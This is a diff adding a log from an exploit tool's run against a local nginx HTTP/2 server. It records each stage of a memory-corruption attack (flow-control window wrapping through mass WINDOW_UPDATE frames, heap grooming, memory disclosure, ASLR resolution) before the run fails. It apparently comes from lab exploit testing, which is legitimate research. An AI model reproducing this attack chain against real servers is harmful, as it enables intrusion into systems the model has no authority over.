@@ -1,0 +1,50 @@
+18:40:47 INFO starting exploit: target=https://127.0.0.1:19444 profile=golden-nginx-1.31.8-debian13-amd64 candidate_profiles=1 command_bytes=26
+18:40:47 INFO TLS connected: version=TLSv1.3 cipher=TLS_AES_256_GCM_SHA384 ALPN=h2
+18:40:47 INFO starting in-band HTTP/2 target profiling and window setup
+18:40:47 INFO runtime HTTP profile: resource=896 initial=2 probes + 71 full + 127 ranged bytes max_concurrent=128 candidates=golden-nginx-1.31.8-debian13-amd64
+18:40:47 INFO initial HTTP/2 connection window exhausted
+18:40:48 INFO triggering cleanup accounting bug: bootstrap_bytes=7340032 TLS_KeyUpdates=262144
+18:41:17 INFO vulnerable cleanup observed: target streams reset after public-byte release
+18:41:17 INFO final TLS key synchronized; bulk window schedule can begin
+18:41:18 INFO sending fixed flood-budget carrier: 15.00 GiB plaintext
+18:41:24 INFO fixed carrier progress: 7% (1.00 GiB sent)
+18:41:30 INFO fixed carrier progress: 13% (2.00 GiB sent)
+18:41:36 INFO fixed carrier progress: 20% (3.00 GiB sent)
+18:41:42 INFO fixed carrier progress: 27% (4.00 GiB sent)
+18:41:48 INFO fixed carrier progress: 33% (5.00 GiB sent)
+18:41:53 INFO fixed carrier progress: 40% (6.00 GiB sent)
+18:41:59 INFO fixed carrier progress: 47% (7.00 GiB sent)
+18:42:05 INFO fixed carrier progress: 53% (8.00 GiB sent)
+18:42:11 INFO fixed carrier progress: 60% (9.00 GiB sent)
+18:42:17 INFO fixed carrier progress: 67% (10.00 GiB sent)
+18:42:23 INFO fixed carrier progress: 73% (11.00 GiB sent)
+18:42:29 INFO fixed carrier progress: 80% (12.00 GiB sent)
+18:42:35 INFO fixed carrier progress: 87% (13.00 GiB sent)
+18:42:40 INFO fixed carrier progress: 93% (14.00 GiB sent)
+18:42:46 INFO fixed carrier progress: 100% (15.00 GiB sent)
+18:42:47 INFO fixed carrier complete: 15.00 GiB in 88.67s
+18:42:47 INFO replaying 8589934593 legal WINDOW_UPDATE frames across 96 owners
+18:43:07 INFO WINDOW_UPDATE replay: 9% (9/96 tranches)
+18:43:27 INFO WINDOW_UPDATE replay: 19% (18/96 tranches)
+18:43:46 INFO WINDOW_UPDATE replay: 28% (27/96 tranches)
+18:44:06 INFO WINDOW_UPDATE replay: 38% (36/96 tranches)
+18:44:25 INFO WINDOW_UPDATE replay: 47% (45/96 tranches)
+18:44:45 INFO WINDOW_UPDATE replay: 56% (54/96 tranches)
+18:45:04 INFO WINDOW_UPDATE replay: 66% (63/96 tranches)
+18:45:24 INFO WINDOW_UPDATE replay: 75% (72/96 tranches)
+18:45:44 INFO WINDOW_UPDATE replay: 84% (81/96 tranches)
+18:46:03 INFO WINDOW_UPDATE replay: 94% (90/96 tranches)
+18:46:16 INFO WINDOW_UPDATE replay: 100% (96/96 tranches)
+18:46:16 INFO wrapped flow-control distance reached; tailored increment=0x7fffc0d5
+18:46:16 INFO opening 16 auxiliary allocator connections
+18:46:20 INFO auxiliary connections ready: 16
+18:46:20 INFO preparing profiled heap layout and reclaim candidates
+18:46:24 INFO profiled B/C heap layout is ready
+18:46:25 INFO heap source and overwrite target allocated; triggering copy
+18:46:26 INFO captured 14393-byte memory disclosure; resolving ASLR
+18:46:26 INFO ASLR resolved: profile=golden-nginx-1.31.8-debian13-amd64 H=0x557b370e2e00 nginx=0x557b2a815840 libc=0x7f6fb0eec000
+18:46:27 INFO B-free barrier observed; releasing 16 reclaim candidates
+18:46:27 INFO reclaim completed; dispatching C cleanup callback
+18:46:30 DEBUG address disclosure capture: wire_bytes=0
+18:46:30 ERROR exploit failed after 343.03s: address disclosure has 0 complete frame chains
+RuntimeError: address disclosure has 0 complete frame chains
